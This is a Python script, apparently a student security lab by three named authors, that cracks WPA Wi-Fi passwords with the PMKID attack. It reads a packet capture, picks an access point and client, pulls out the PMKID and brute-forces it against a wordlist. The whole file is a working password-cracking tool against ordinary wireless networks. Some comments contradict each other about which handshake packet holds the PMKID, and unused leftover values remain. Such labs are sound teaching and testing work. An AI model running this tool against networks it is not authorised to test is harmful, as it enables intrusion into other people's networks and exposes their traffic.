#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Auteurs: David Gallay, Jean Gachet, Yanick Thomann

This script is used to crack a WPA password using the PMKID attack.
It parses a pcap file passed as commandline argument (-c/--pcap) and checks for SSIDs
It also takes a wordlist (-w/--wordlist) used for bruteforcing the wifi password

Script utilisé pour cracker un mot de passe WPA avec l'attaque sur PMKID
Il parcourt un fichier pcap (-c/--pcap) et cherche des SSID annoncant un PMKID
Il utilise une list de mots (-w/--wordlist) pour bruteforcer le mot de passe du Wifi

"""



from scapy.all import *
from pbkdf2 import *
import hmac, hashlib
import argparse

# Argument handling
parser = argparse.ArgumentParser(description='Process .pcap file and wordlist file')
parser.add_argument('-c', '--pcap', type=str, required=True,help='path to .pcap file')
parser.add_argument('-w', '--wordlist', type=str, required=True,help='path to wordlist file')

args = parser.parse_args()

pcap = args.pcap
wordlist = args.wordlist


# Custom class to store the SSID and MAC address of an AP   
class AP(NamedTuple):
    ssid: str
    mac_address: str

# Function used to get APs from a pcap capture
def find_ssid(pcap):
    # Initialize and empty dictionary to contain APs
    ssids = {}
    # Iterate over all packets in capture
    for packet in pcap:
        # If the packet is a 802.11 beacon
        if packet.haslayer(Dot11Beacon):
            # Retrieve the SSID
            ssid = packet[Dot11Elt].info.decode()
            # Add AP to dict if not seen before
            if ssid not in ssids:
                ssids[ssid] = packet.addr2
    # If there is only one AP found, return its SSID and MAC in an AP object
    if len(ssids) == 1:
        ssid, mac = next(iter(ssids.items()))
        return AP(ssid=ssid, mac_address=mac)
    # If there are multiple, ask user to choose and return the chosen one
    elif len(ssids) > 1:
        # Initialiaze empty array for found APs
        ssid_infos = []
        # Add AP object to array
        for ssid, mac in ssids.items():
            ssid_infos.append(AP(ssid=ssid, mac_address=mac))
        
        print("Multiple SSIDs found:")
        
        # Display found APs with index
        for i, ssid_info in enumerate(ssid_infos):
            print(f"{i}: SSID: {ssid_info.ssid} | MAC Address: {ssid_info.mac_address}")
        chosen_ssid_index = input("Enter the number of the AP you want to choose: ")
        
        # Ask for input as long as the input is not valid
        while not chosen_ssid_index.isdigit() or int(chosen_ssid_index) not in range(len(ssids)):
            chosen_ssid_index = input("Invalid choice. Please choose an SSID by typing its index: ")
        
        # Retrieve SSID and MAC address for chosen AP
        chosen_ssid = ssid_infos[int(chosen_ssid_index)].ssid
        mac = ssids[chosen_ssid]
        
        return AP(ssid=chosen_ssid, mac_address=mac)
    else:
        print("No AP found in capture, exiting...")
        exit()

# Function used to find clients who were captured doing a 4-way handshake with an AP
def get_wpa_clients(pcap, ap_mac):
    # Create a list to store the client MAC addresses
    clients = []
    
    # Loop through the packets in the capture file
    for pkt in pcap:
        # Check if the packet is a WPA 4-way handshake packet
        if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3:
            # Check if the packet is from the AP we're interested in
            if pkt.addr2 == ap_mac:
                # Check if the client MAC address is already in the list
                if pkt.addr1 not in clients:
                    clients.append(pkt.addr1)
    
    # Check if there are any clients in the list
    if len(clients) == 0:
        print("No clients found.")
        return None
    
    # Check if there is only one client in the list
    elif len(clients) == 1:
        print("Found 1 client: " + clients[0])
        return clients[0]
    
    # If there are multiple clients in the list, ask the user to choose one
    else:
        print("Found multiple clients:")
        for i, client in enumerate(clients):
            print(str(i) + ": " + client)
        choice = int(input("Enter the number of the client you want to choose: "))
        return clients[choice]

# Function used to retrive the PMKID from the 1st packet of a WPA 4-way handshake
def get_wpa_pmkid(pcap, client_mac, ap_mac):
    for packet in pcap:
        # check if the packet is the fourth packet of a 4-way handshake from the client to the AP
        if (packet.haslayer(EAPOL) 
        and packet[EAPOL].type == 3 
        and packet.addr1.lower() == client_mac
        and packet.addr2.lower() == ap_mac):
            # Extract the PMKID value from the packet
            pmkid = packet[EAPOL].load[-16:].hex()
            return pmkid
    # if no WPA MIC is found, return None
    print("PMKID not found")
    exit()

# Function to calculate PMKID
def make_pmkid(ap_mac, client_mac, ssid, passphrase):
    ap_mac = ap_mac.lower().replace(":", "")
    client_mac = client_mac.lower().replace(":", "")
    ssid = ssid.encode()
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid, 4096, 32)
    pmkid = hmac.new(pmk, b"PMK Name" + bytes.fromhex(ap_mac) + bytes.fromhex(client_mac), hashlib.sha1).hexdigest()[:32]
    return pmkid

# Read pcap
wpa=rdpcap(pcap)

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
# Construct an AP object from the capture
AP          = find_ssid(wpa)
ssid        = AP.ssid
ap_mac      = AP.mac_address
# Get the client mac address
cl_mac      = get_wpa_clients(wpa, AP.mac_address)
# Get the ssid from the AP object



# Retrieve the PMKID from the wireshark capture to check bruteforce against
pmkid_to_check = get_wpa_pmkid(wpa, cl_mac, ap_mac)

# Read wordlist line by line
with open(wordlist, 'r') as file:
    for line in file:
        # Calculate the PMKID for the given password
        pmkid_for_line = make_pmkid(ap_mac, cl_mac, ssid, line.strip())

        if pmkid_for_line == pmkid_to_check:
            print(f'WPA Password is : {line}')
            exit()

    print('No matching password found in wordlist')
